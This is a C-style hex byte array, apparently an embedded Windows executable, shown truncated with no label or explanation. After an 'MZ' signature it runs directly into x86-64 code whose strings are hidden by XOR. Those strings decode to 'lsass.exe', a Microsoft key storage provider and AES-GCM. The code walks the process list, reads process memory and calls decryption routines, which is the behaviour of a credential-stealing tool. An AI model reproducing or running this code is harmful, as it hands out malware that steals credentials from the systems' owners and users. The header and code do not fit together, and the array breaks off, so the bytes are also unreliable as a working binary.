{0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,
0x0d, 0x0b, 0x2d, 0x01, 0x00, 0x75, 0x3b, 0xc7, 0x44, 0x24, 0x20, 0x79, 0x73, 0x79, 0x7e, 0x48,
0x8b, 0xd3, 0xc7, 0x44, 0x24, 0x24, 0x6f, 0x67, 0x55, 0x63, 0xc7, 0x44, 0x24, 0x28, 0x64, 0x6c,
0x65, 0x00, 0x8a, 0x44, 0x14, 0x20, 0x40, 0x32, 0xc6, 0x88, 0x04, 0x0a, 0x48, 0x03, 0xd7, 0x48,
0x83, 0xfa, 0x0b, 0x72, 0xed, 0x88, 0x1d, 0xe0, 0x2c, 0x01, 0x00, 0x40, 0x88, 0x3d, 0x7b, 0x03,
0x01, 0x00, 0x44, 0x8b, 0x44, 0x24, 0x44, 0x48, 0x8b, 0x54, 0x24, 0x38, 0xe8, 0xdf, 0xf5, 0xff,
0xff, 0x48, 0x8d, 0x4c, 0x24, 0x38, 0xe8, 0x1d, 0xe6, 0xff, 0xff, 0x48, 0x8b, 0x9c, 0x24, 0xe0,
0x01, 0x00, 0x00, 0x48, 0x81, 0xc4, 0xb0, 0x01, 0x00, 0x00, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc,
0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83,
0xec, 0x70, 0x48, 0x8b, 0x1d, 0xb7, 0x04, 0x01, 0x00, 0x33, 0xff, 0x48, 0x89, 0x7d, 0x10, 0xff,
0x15, 0x1b, 0x04, 0x01, 0x00, 0x48, 0x8b, 0xc8, 0x4c, 0x8d, 0x45, 0x10, 0x8d, 0x57, 0x28, 0xff,
0xd3, 0x85, 0xc0, 0x0f, 0x84, 0x98, 0x01, 0x00, 0x00, 0x40, 0x38, 0x3d, 0x24, 0x03, 0x01, 0x00,
0x48, 0x8b, 0x05, 0x91, 0x04, 0x01, 0x00, 0x89, 0x7d, 0xd8, 0x75, 0x25, 0x66, 0x0f, 0x6f, 0x05,
0xec, 0xf5, 0x00, 0x00, 0x0f, 0x57, 0x05, 0xb5, 0xfa, 0x00, 0x00, 0xf3, 0x0f, 0x7f, 0x05, 0xed,
0x35, 0x01, 0x00, 0x40, 0x88, 0x3d, 0xf6, 0x35, 0x01, 0x00, 0xc6, 0x05, 0xf3, 0x02, 0x01, 0x00,
0x01, 0x4c, 0x8d, 0x45, 0xdc, 0x33, 0xc9, 0x48, 0x8d, 0x15, 0xd2, 0x35, 0x01, 0x00, 0xff, 0xd0,
0xbb, 0x02, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x74, 0x15, 0x8b, 0x45, 0xd8, 0x48, 0x8d, 0x0c, 0x40,
0x89, 0x5c, 0x8d, 0xe4, 0x8b, 0x4d, 0xd8, 0xff, 0xc1, 0x89, 0x4d, 0xd8, 0xeb, 0x03, 0x8b, 0x4d,
0xd8, 0x40, 0x38, 0x3d, 0xb1, 0x02, 0x01, 0x00, 0x48, 0x8d, 0x15, 0x11, 0x32, 0x01, 0x00, 0x4c,
0x8b, 0x0d, 0x22, 0x04, 0x01, 0x00, 0x75, 0x38, 0x66, 0x0f, 0x6f, 0x05, 0xb0, 0xf9, 0x00, 0x00,
0x4c, 0x8b, 0xc7, 0xf3, 0x0f, 0x7f, 0x45, 0xc0, 0x66, 0xc7, 0x45, 0xd0, 0x6f, 0x00, 0x42, 0x8a,
0x44, 0x05, 0xc0, 0x34, 0x0a, 0x41, 0x88, 0x04, 0x10, 0x49, 0xff, 0xc0, 0x49, 0x83, 0xf8, 0x11,
0x72, 0xec, 0x40, 0x88, 0x3d, 0xe8, 0x31, 0x01, 0x00, 0xc6, 0x05, 0x69, 0x02, 0x01, 0x00, 0x01,
0x8b, 0xc1, 0x4c, 0x8d, 0x45, 0xdc, 0x48, 0x8d, 0x0c, 0x40, 0x4d, 0x8d, 0x04, 0x88, 0x33, 0xc9,
0x41, 0xff, 0xd1, 0x85, 0xc0, 0x74, 0x15, 0x8b, 0x45, 0xd8, 0x48, 0x8d, 0x0c, 0x40, 0x89, 0x5c,
0x8d, 0xe4, 0x8b, 0x4d, 0xd8, 0xff, 0xc1, 0x89, 0x4d, 0xd8, 0xeb, 0x03, 0x8b, 0x4d, 0xd8, 0x40,
0x38, 0x3d, 0x49, 0x05, 0x01, 0x00, 0x48, 0x8d, 0x15, 0xf3, 0x08, 0x01, 0x00, 0x4c, 0x8b, 0x0d,
0xa4, 0x03, 0x01, 0x00, 0x75, 0x3c, 0x66, 0x0f, 0x6f, 0x05, 0x92, 0xf9, 0x00, 0x00, 0x4c, 0x8b,
0xc7, 0xf3, 0x0f, 0x7f, 0x45, 0xc0, 0x66, 0xc7, 0x45, 0xd0, 0x6d, 0x6f, 0x40, 0x88, 0x7d, 0xd2,
0x42, 0x8a, 0x44, 0x05, 0xc0, 0x34, 0x0a, 0x41, 0x88, 0x04, 0x10, 0x49, 0xff, 0xc0, 0x49, 0x83,
0xf8, 0x12, 0x72, 0xec, 0x40, 0x88, 0x3d, 0xc7, 0x08, 0x01, 0x00, 0xc6, 0x05, 0xfd, 0x04, 0x01,
0x00, 0x01, 0x8b, 0xc1, 0x4c, 0x8d, 0x45, 0xdc, 0x48, 0x8d, 0x0c, 0x40, 0x4d, 0x8d, 0x04, 0x88,
0x33, 0xc9, 0x41, 0xff, 0xd1, 0x85, 0xc0, 0x74, 0x15, 0x8b, 0x45, 0xd8, 0x48, 0x8d, 0x0c, 0x40,
0x89, 0x5c, 0x8d, 0xe4, 0x8b, 0x45, 0xd8, 0xff, 0xc0, 0x89, 0x45, 0xd8, 0xeb, 0x03, 0x8b, 0x45,
0xd8, 0x85, 0xc0, 0x74, 0x20, 0x48, 0x8b, 0x4d, 0x10, 0x4c, 0x8d, 0x45, 0xd8, 0x48, 0x89, 0x7c,
0x24, 0x28, 0x41, 0xb9, 0x28, 0x00, 0x00, 0x00, 0x33, 0xd2, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xff,
0x15, 0x1b, 0x03, 0x01, 0x00, 0x48, 0x8b, 0x4d, 0x10, 0xff, 0x15, 0x81, 0x02, 0x01, 0x00, 0xb0,
0x01, 0x4c, 0x8d, 0x5c, 0x24, 0x70, 0x49, 0x8b, 0x5b, 0x18, 0x49, 0x8b, 0x7b, 0x20, 0x49, 0x8b,
0xe3, 0x5d, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x55, 0x57,
0x41, 0x54, 0x41, 0x55, 0x41, 0x57, 0x48, 0x8d, 0xac, 0x24, 0x70, 0xfe, 0xff, 0xff, 0x48, 0x81,
0xec, 0x90, 0x02, 0x00, 0x00, 0xe8, 0xf6, 0xfd, 0xff, 0xff, 0x48, 0x8b, 0x05, 0x9f, 0x02, 0x01,
0x00, 0x33, 0xd2, 0x8d, 0x4a, 0x02, 0xff, 0xd0, 0x48, 0x8b, 0xd8, 0x48, 0x83, 0xf8, 0xff, 0x0f,
0x84, 0x0d, 0x01, 0x00, 0x00, 0xba, 0x38, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x7c, 0x24, 0x50, 0x8b,
0xca, 0x33, 0xc0, 0xf3, 0xaa, 0x89, 0x54, 0x24, 0x50, 0x33, 0xf6, 0x48, 0x8d, 0x54, 0x24, 0x50,
0x48, 0x8b, 0xcb, 0x8b, 0xfe, 0xff, 0x15, 0x6d, 0x02, 0x01, 0x00, 0x44, 0x8d, 0x66, 0x0a, 0x85,
0xc0, 0x0f, 0x84, 0x90, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x3d, 0xb2, 0x0b, 0x01, 0x00, 0x40, 0x38,
0x35, 0x8d, 0x04, 0x01, 0x00, 0x75, 0x51, 0xc7, 0x44, 0x24, 0x30, 0x66, 0x00, 0x79, 0x00, 0x48,
0x8b, 0xce, 0xc7, 0x44, 0x24, 0x34, 0x6b, 0x00, 0x79, 0x00, 0xc7, 0x44, 0x24, 0x38, 0x79, 0x00,
0x24, 0x00, 0xc7, 0x44, 0x24, 0x3c, 0x6f, 0x00, 0x72, 0x00, 0xc7, 0x44, 0x24, 0x40, 0x6f, 0x00,
0x00, 0x00, 0x0f, 0xb7, 0x44, 0x0c, 0x30, 0x66, 0x41, 0x33, 0xc4, 0x66, 0x42, 0x89, 0x04, 0x39,
0x48, 0x83, 0xc1, 0x02, 0x48, 0x83, 0xf9, 0x12, 0x72, 0xe8, 0x66, 0x89, 0x35, 0x71, 0x0b, 0x01,
0x00, 0xc6, 0x05, 0x3a, 0x04, 0x01, 0x00, 0x01, 0x49, 0x8b, 0xd7, 0x48, 0x8d, 0x4c, 0x24, 0x7c,
0xe8, 0x6b, 0xc2, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x1a, 0x48, 0x8b, 0x05, 0xf0, 0x01, 0x01, 0x00,
0x48, 0x8d, 0x54, 0x24, 0x50, 0x48, 0x8b, 0xcb, 0xff, 0xd0, 0x85, 0xc0, 0x74, 0x09, 0xe9, 0x7b,
0xff, 0xff, 0xff, 0x8b, 0x7c, 0x24, 0x58, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0x60, 0x01, 0x01, 0x00,
0x85, 0xff, 0x74, 0x3e, 0x48, 0x8b, 0x05, 0xcd, 0x01, 0x01, 0x00, 0x44, 0x8b, 0xc7, 0x33, 0xd2,
0xb9, 0x00, 0x04, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x23, 0x48,
0x8b, 0x3d, 0xba, 0x01, 0x01, 0x00, 0x4c, 0x8d, 0x85, 0xc0, 0x01, 0x00, 0x00, 0x41, 0x8b, 0xd4,
0x48, 0x8b, 0xc8, 0xff, 0xd7, 0x85, 0xc0, 0x75, 0x27, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0x1e, 0x01,
0x01, 0x00, 0x33, 0xc0, 0x4c, 0x8d, 0x9c, 0x24, 0x90, 0x02, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x40,
0x49, 0x8b, 0x73, 0x48, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5d, 0xc3,
0x48, 0x8b, 0x05, 0x91, 0x01, 0x01, 0x00, 0x48, 0x8d, 0x8d, 0xc8, 0x01, 0x00, 0x00, 0x48, 0x89,
0x4c, 0x24, 0x28, 0x41, 0xb9, 0x02, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8d, 0xc0, 0x01, 0x00, 0x00,
0x45, 0x33, 0xc0, 0xba, 0x00, 0x00, 0x00, 0x02, 0xc7, 0x44, 0x24, 0x20, 0x02, 0x00, 0x00, 0x00,
0xff, 0xd0, 0x85, 0xc0, 0x75, 0x0f, 0x48, 0x8b, 0x8d, 0xc0, 0x01, 0x00, 0x00, 0xff, 0x15, 0xbd,
0x00, 0x01, 0x00, 0xeb, 0x94, 0x48, 0x8b, 0x05, 0x54, 0x01, 0x01, 0x00, 0x48, 0x8b, 0x8d, 0xc8,
0x01, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x8b, 0x8d, 0xc8, 0x01, 0x00, 0x00, 0x8b, 0xf8, 0xff, 0x15,
0x9c, 0x00, 0x01, 0x00, 0x48, 0x8b, 0x8d, 0xc0, 0x01, 0x00, 0x00, 0xff, 0x15, 0x8f, 0x00, 0x01,
0x00, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0x86, 0x00, 0x01, 0x00, 0x8b, 0xc7, 0xe9, 0x63, 0xff, 0xff,
0xff, 0xcc, 0xcc, 0xcc, 0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x5b, 0x08, 0x49, 0x89, 0x73, 0x10, 0x49,
0x89, 0x7b, 0x18, 0x41, 0x56, 0x48, 0x83, 0xec, 0x60, 0x48, 0x8b, 0x05, 0x10, 0x01, 0x01, 0x00,
0x4c, 0x8b, 0xf1, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x9c, 0x00, 0x00, 0x00, 0x48, 0x85, 0xd2, 0x0f,
0x84, 0x93, 0x00, 0x00, 0x00, 0x45, 0x85, 0xc0, 0x0f, 0x84, 0x8a, 0x00, 0x00, 0x00, 0x49, 0x8d,
0x4b, 0xd8, 0x45, 0x89, 0x43, 0xe8, 0x49, 0x89, 0x4b, 0xc8, 0x45, 0x33, 0xc9, 0x49, 0x89, 0x53,
0xf0, 0x49, 0x8d, 0x4b, 0xe8, 0xc7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00, 0x45, 0x33, 0xc0,
0xc7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x33, 0xd2, 0x49, 0xc7, 0x43, 0xb8, 0x00, 0x00,
0x00, 0x00, 0x49, 0xc7, 0x43, 0xe0, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x85, 0xc0, 0x74, 0x48,
0x48, 0x8b, 0x74, 0x24, 0x48, 0x48, 0x85, 0xf6, 0x74, 0x3e, 0x8b, 0x5c, 0x24, 0x40, 0x85, 0xdb,
0x74, 0x28, 0x41, 0x8b, 0x56, 0x08, 0x49, 0x8b, 0xce, 0x03, 0xd3, 0xe8, 0xd0, 0xea, 0xff, 0xff,
0x49, 0x83, 0x3e, 0x00, 0x74, 0x0f, 0x41, 0x8b, 0x7e, 0x08, 0x8b, 0xcb, 0x49, 0x03, 0x3e, 0xf3,
0xa4, 0x41, 0x01, 0x5e, 0x08, 0x48, 0x8b, 0x74, 0x24, 0x48, 0x48, 0x85, 0xf6, 0x74, 0x09, 0x48,
0x8b, 0xce, 0xff, 0x15, 0x70, 0x00, 0x01, 0x00, 0x4c, 0x8d, 0x5c, 0x24, 0x60, 0x49, 0x8b, 0x5b,
0x10, 0x49, 0x8b, 0x73, 0x18, 0x49, 0x8b, 0x7b, 0x20, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0xc3, 0xcc,
0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x48, 0x89, 0x78, 0x20, 0x44,
0x89, 0x40, 0x18, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x68, 0xa1,
0x48, 0x81, 0xec, 0xa0, 0x00, 0x00, 0x00, 0x45, 0x33, 0xed, 0x4d, 0x8b, 0xf1, 0x4c, 0x39, 0x2d,
0x94, 0x00, 0x01, 0x00, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xd9, 0x0f, 0x84, 0x1f, 0x02, 0x00, 0x00,
0xe8, 0xef, 0xfc, 0xff, 0xff, 0x85, 0xc0, 0x0f, 0x84, 0x12, 0x02, 0x00, 0x00, 0x44, 0x38, 0x2d,
0x16, 0x02, 0x01, 0x00, 0x48, 0x8d, 0x05, 0x85, 0x24, 0x01, 0x00, 0x48, 0x8b, 0x3d, 0x66, 0x00,
0x01, 0x00, 0x4c, 0x89, 0x6d, 0xdf, 0x4c, 0x89, 0x6d, 0xd7, 0x0f, 0x85, 0xc3, 0x00, 0x00, 0x00,
0xc7, 0x45, 0xe7, 0x47, 0x00, 0x63, 0x00, 0x48, 0x8d, 0x15, 0x62, 0x24, 0x01, 0x00, 0xc7, 0x45,
0xeb, 0x69, 0x00, 0x78, 0x00, 0x41, 0x8b, 0xcd, 0xc7, 0x45, 0xef, 0x65, 0x00, 0x79, 0x00, 0xc7,
0x45, 0xf3, 0x65, 0x00, 0x6c, 0x00, 0xc7, 0x45, 0xf7, 0x7e, 0x00, 0x2a, 0x00, 0xc7, 0x45, 0xfb,
0x59, 0x00, 0x65, 0x00, 0xc7, 0x45, 0xff, 0x6c, 0x00, 0x7e, 0x00, 0xc7, 0x45, 0x03, 0x7d, 0x00,
0x6b, 0x00, 0xc7, 0x45, 0x07, 0x78, 0x00, 0x6f, 0x00, 0xc7, 0x45, 0x0b, 0x2a, 0x00, 0x41, 0x00,
0xc7, 0x45, 0x0f, 0x6f, 0x00, 0x73, 0x00, 0xc7, 0x45, 0x13, 0x2a, 0x00, 0x59, 0x00, 0xc7, 0x45,
0x17, 0x7e, 0x00, 0x65, 0x00, 0xc7, 0x45, 0x1b, 0x78, 0x00, 0x6b, 0x00, 0xc7, 0x45, 0x1f, 0x6d,
0x00, 0x6f, 0x00, 0xc7, 0x45, 0x23, 0x2a, 0x00, 0x5a, 0x00, 0xc7, 0x45, 0x27, 0x78, 0x00, 0x65,
0x00, 0xc7, 0x45, 0x2b, 0x7c, 0x00, 0x63, 0x00, 0xc7, 0x45, 0x2f, 0x6e, 0x00, 0x6f, 0x00, 0xc7,
0x45, 0x33, 0x78, 0x00, 0x00, 0x00, 0x0f, 0xb7, 0x44, 0x0d, 0xe7, 0x66, 0x83, 0xf0, 0x0a, 0x66,
0x89, 0x04, 0x11, 0x48, 0x83, 0xc1, 0x02, 0x48, 0x83, 0xf9, 0x4e, 0x72, 0xe9, 0x66, 0x44, 0x89,
0x2d, 0x09, 0x24, 0x01, 0x00, 0x48, 0x8d, 0x05, 0xb4, 0x23, 0x01, 0x00, 0xc6, 0x05, 0x37, 0x01,
0x01, 0x00, 0x01, 0x41, 0xbc, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0xdf, 0x45, 0x8b, 0xc4,
0x48, 0x8b, 0xd0, 0xff, 0xd7, 0x85, 0xc0, 0x0f, 0x85, 0x0c, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x05,
0x7c, 0xff, 0x00, 0x00, 0x48, 0x8d, 0x55, 0xd7, 0x48, 0x8b, 0x4d, 0xdf, 0x45, 0x33, 0xc9, 0x4d,
0x8b, 0xc6, 0x44, 0x89, 0x6c, 0x24, 0x20, 0xff, 0xd0, 0x85, 0xc0, 0x0f, 0x85, 0xde, 0x00, 0x00,
0x00, 0x48, 0x8b, 0x05, 0x60, 0xff, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x77, 0x44, 0x89, 0x64, 0x24,
0x38, 0x45, 0x8d, 0x74, 0x24, 0xe0, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x45, 0x33, 0xc9, 0x48, 0x8b,
0x4d, 0xd7, 0x45, 0x8b, 0xc6, 0x44, 0x89, 0x6c, 0x24, 0x28, 0x48, 0x8b, 0xd6, 0x4c, 0x89, 0x6c,
0x24, 0x20, 0x44, 0x89, 0x6d, 0x77, 0xff, 0xd0, 0x85, 0xc0, 0x0f, 0x85, 0x95, 0x00, 0x00, 0x00,
0x8b, 0x45, 0x77, 0x85, 0xc0, 0x0f, 0x84, 0x8a, 0x00, 0x00, 0x00, 0x8b, 0xc8, 0xe8, 0x92, 0xbf,
0xff, 0xff, 0x4c, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0x7b, 0x8b, 0x4d, 0x77, 0x48, 0x8d, 0x45,
0x77, 0x48, 0x8b, 0x3d, 0x00, 0xff, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x44, 0x89, 0x64, 0x24, 0x38,
0x45, 0x8b, 0xc6, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8b, 0xd6, 0x89, 0x4c, 0x24, 0x28, 0x48,
0x8b, 0x4d, 0xd7, 0x4c, 0x89, 0x7c, 0x24, 0x20, 0xff, 0xd7, 0x85, 0xc0, 0x75, 0x2e, 0x44, 0x8b,
0x75, 0x77, 0x45, 0x85, 0xf6, 0x74, 0x25, 0x8b, 0x53, 0x08, 0x48, 0x8b, 0xcb, 0x41, 0x03, 0xd6,
0xe8, 0x7b, 0xe8, 0xff, 0xff, 0x4c, 0x39, 0x2b, 0x74, 0x12, 0x8b, 0x7b, 0x08, 0x41, 0x8b, 0xce,
0x48, 0x03, 0x3b, 0x49, 0x8b, 0xf7, 0xf3, 0xa4, 0x44, 0x01, 0x73, 0x08, 0x48, 0x8b, 0x05, 0x4d,
0xfd, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x0d, 0x33, 0xd2, 0x41, 0xb8, 0x00, 0x80, 0x00, 0x00,
0x49, 0x8b, 0xcf, 0xff, 0xd0, 0x48, 0x8b, 0x4d, 0xd7, 0xff, 0x15, 0x91, 0xfe, 0x00, 0x00, 0x48,
0x8b, 0x4d, 0xdf, 0xff, 0x15, 0x87, 0xfe, 0x00, 0x00, 0xff, 0x15, 0xe9, 0xfd, 0x00, 0x00, 0x4c,
0x8d, 0x9c, 0x24, 0xa0, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x30, 0x49, 0x8b, 0x73, 0x38, 0x49,
0x8b, 0x7b, 0x48, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5d, 0xc3,
0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x48, 0x89, 0x78, 0x18, 0x55,
0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x68, 0xc9, 0x48, 0x81, 0xec, 0xf0,
0x00, 0x00, 0x00, 0x48, 0x8b, 0x3d, 0x3e, 0xfe, 0x00, 0x00, 0x45, 0x33, 0xed, 0x4d, 0x8b, 0xe1,
0x41, 0x8b, 0xd8, 0x4c, 0x8b, 0xfa, 0x4c, 0x8b, 0xf1, 0x48, 0x85, 0xff, 0x0f, 0x84, 0xec, 0x02,
0x00, 0x00, 0x4c, 0x39, 0x2d, 0x27, 0xfe, 0x00, 0x00, 0x0f, 0x84, 0xdf, 0x02, 0x00, 0x00, 0x4c,
0x39, 0x2d, 0x22, 0xfe, 0x00, 0x00, 0x0f, 0x84, 0xd2, 0x02, 0x00, 0x00, 0x4c, 0x39, 0x2d, 0x1d,
0xfe, 0x00, 0x00, 0x0f, 0x84, 0xc5, 0x02, 0x00, 0x00, 0x44, 0x38, 0x2d, 0xa6, 0xfe, 0x00, 0x00,
0x48, 0x8d, 0x15, 0xd1, 0x03, 0x01, 0x00, 0x4c, 0x89, 0x6d, 0x8f, 0x4c, 0x89, 0x6d, 0x9f, 0x75,
0x37, 0xc7, 0x45, 0x97, 0x4b, 0x00, 0x4f, 0x00, 0x41, 0x8b, 0xcd, 0xc7, 0x45, 0x9b, 0x59, 0x00,
0x00, 0x00, 0x0f, 0xb7, 0x44, 0x0d, 0x97, 0x66, 0x83, 0xf0, 0x0a, 0x66, 0x89, 0x04, 0x11, 0x48,
0x83, 0xc1, 0x02, 0x48, 0x83, 0xf9, 0x06, 0x72, 0xe9, 0x66, 0x44, 0x89, 0x2d, 0x9d, 0x03, 0x01,
0x00, 0xc6, 0x05, 0x5e, 0xfe, 0x00, 0x00, 0x01, 0x45, 0x33, 0xc9, 0x48, 0x8d, 0x4d, 0x8f, 0x45,
0x33, 0xc0, 0xff, 0xd7, 0x48, 0x8b, 0x75, 0x8f, 0x48, 0x85, 0xf6, 0x0f, 0x84, 0x5d, 0x02, 0x00,
0x00, 0x44, 0x38, 0x2d, 0x51, 0xff, 0x00, 0x00, 0x4c, 0x8d, 0x05, 0x31, 0x2b, 0x01, 0x00, 0x75,
0x67, 0xc7, 0x44, 0x24, 0x50, 0x49, 0x00, 0x62, 0x00, 0x49, 0x8b, 0xcd, 0xc7, 0x44, 0x24, 0x54,
0x6b, 0x00, 0x63, 0x00, 0xc7, 0x44, 0x24, 0x58, 0x64, 0x00, 0x63, 0x00, 0xc7, 0x44, 0x24, 0x5c,
0x64, 0x00, 0x6d, 0x00, 0xc7, 0x44, 0x24, 0x60, 0x47, 0x00, 0x65, 0x00, 0xc7, 0x45, 0x83, 0x6e,
0x00, 0x6f, 0x00, 0xc7, 0x45, 0x87, 0x4d, 0x00, 0x49, 0x00, 0xc7, 0x45, 0x8b, 0x47, 0x00, 0x00,
0x00, 0x0f, 0xb7, 0x44, 0x0c, 0x50, 0x66, 0x83, 0xf0, 0x0a, 0x66, 0x42, 0x89, 0x04, 0x01, 0x48,
0x83, 0xc1, 0x02, 0x48, 0x83, 0xf9, 0x1e, 0x72, 0xe8, 0x66, 0x44, 0x89, 0x2d, 0xed, 0x2a, 0x01,
0x00, 0xc6, 0x05, 0xe1, 0xfe, 0x00, 0x00, 0x01, 0x44, 0x38, 0x2d, 0x7c, 0xfe, 0x00, 0x00, 0x48,
0x8d, 0x15, 0x72, 0x17, 0x01, 0x00, 0x75, 0x5d, 0xc7, 0x44, 0x24, 0x50, 0x49, 0x00, 0x62, 0x00,
0x49, 0x8b, 0xfd, 0xc7, 0x44, 0x24, 0x54, 0x6b, 0x00, 0x63, 0x00, 0xc7, 0x44, 0x24, 0x58, 0x64,
0x00, 0x63, 0x00, 0xc7, 0x44, 0x24, 0x5c, 0x64, 0x00, 0x6d, 0x00, 0xc7, 0x44, 0x24, 0x60, 0x47,
0x00, 0x65, 0x00, 0xc7, 0x45, 0x83, 0x6e, 0x00, 0x6f, 0x00, 0x66, 0x44, 0x89, 0x6d, 0x87, 0x0f,
0xb7, 0x44, 0x3c, 0x50, 0x66, 0x83, 0xf0, 0x0a, 0x66, 0x89, 0x04, 0x17, 0x48, 0x83, 0xc7, 0x02,
0x48, 0x83, 0xff, 0x18, 0x72, 0xe9, 0x66, 0x44, 0x89, 0x2d, 0x32, 0x17, 0x01, 0x00, 0xc6, 0x05,
0x16, 0xfe, 0x00, 0x00, 0x01, 0x41, 0xb9, 0x20, 0x00, 0x00, 0x00, 0x44, 0x89, 0x6c, 0x24, 0x20,
0x48, 0x8b, 0xce, 0xff, 0x15, 0xa7, 0xfc, 0x00, 0x00, 0x48, 0x8b, 0x4d, 0x8f, 0x48, 0x8d, 0x55,
0x9f, 0x44, 0x89, 0x6c, 0x24, 0x30, 0x45, 0x33, 0xc9, 0x89, 0x5c, 0x24, 0x28, 0x45, 0x33, 0xc0,
0x4c, 0x89, 0x7c, 0x24, 0x20, 0xff, 0x15, 0x8d, 0xfc, 0x00, 0x00, 0x48, 0x8b, 0x75, 0x9f, 0x48,
0x85, 0xf6, 0x0f, 0x84, 0x22, 0x01, 0x00, 0x00, 0x44, 0x8b, 0x45, 0x6f, 0x48, 0x8d, 0x7d, 0xaf,
0x33, 0xc0, 0x44, 0x89, 0x6c, 0x24, 0x48, 0x4c, 0x8d, 0x4d, 0xaf, 0x44, 0x89, 0x6d, 0x5f, 0x8d,
0x50, 0x58, 0x8b, 0xca, 0xf3, 0xaa, 0x48, 0x8b, 0x45, 0x77, 0x48, 0x8b, 0xce, 0x48, 0x89, 0x45,
0xd7, 0x48, 0x8d, 0x45, 0x5f, 0x48, 0x89, 0x44, 0x24, 0x40, 0x44, 0x89, 0x6c, 0x24, 0x38, 0x4c,
0x89, 0x6c, 0x24, 0x30, 0x89, 0x55, 0xaf, 0x48, 0x8b, 0x55, 0x67, 0x44, 0x89, 0x6c, 0x24, 0x28,
0x4c, 0x89, 0x6c, 0x24, 0x20, 0xc7, 0x45, 0xb3, 0x01, 0x00, 0x00, 0x00, 0x4c, 0x89, 0x65, 0xb7,
0xc7, 0x45, 0xbf, 0x0c, 0x00, 0x00, 0x00, 0xc7, 0x45, 0xdf, 0x10, 0x00, 0x00, 0x00, 0xff, 0x15,
0x1c, 0xfc, 0x00, 0x00, 0x8b, 0x45, 0x5f, 0x85, 0xc0, 0x0f, 0x84, 0x99, 0x00, 0x00, 0x00, 0x8b,
0xc8, 0xe8, 0x5e, 0xbc, 0xff, 0xff, 0x4c, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x86, 0x00,
